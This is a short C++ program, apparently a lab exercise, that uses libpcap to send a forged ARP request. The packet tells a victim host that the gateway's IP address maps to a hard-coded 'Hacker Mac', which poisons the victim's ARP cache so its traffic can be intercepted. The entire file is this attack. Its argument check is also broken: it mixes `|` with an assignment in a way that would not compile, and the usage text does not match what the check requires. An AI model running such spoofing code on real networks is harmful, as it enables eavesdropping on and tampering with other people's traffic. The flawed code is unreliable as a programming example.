#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	
	int size=0;	
	if ( argc < 4 | size = ((argc % 2) == 1)) {//input error
		usage();
		return -1;
	}
	printf("size = %d\n",size);
	
	char* dev = argv[1];//interface 
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev,BUFSIZ , 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("28:d0:ea:de:1f:5c");//Sender Mac
	packet.eth_.smac_ = Mac("08:00:27:03:83:4d");//Hacker Mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("08:00:27:03:83:4d");//Hacker Mac
	packet.arp_.sip_ = htonl(Ip("172.30.1.254"));//Gateway Ip
	packet.arp_.tmac_ = Mac("28:d0:ea:de:1f:5c");//Sender Mac
	packet.arp_.tip_ = htonl(Ip("172.30.1.57"));//Sender Ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
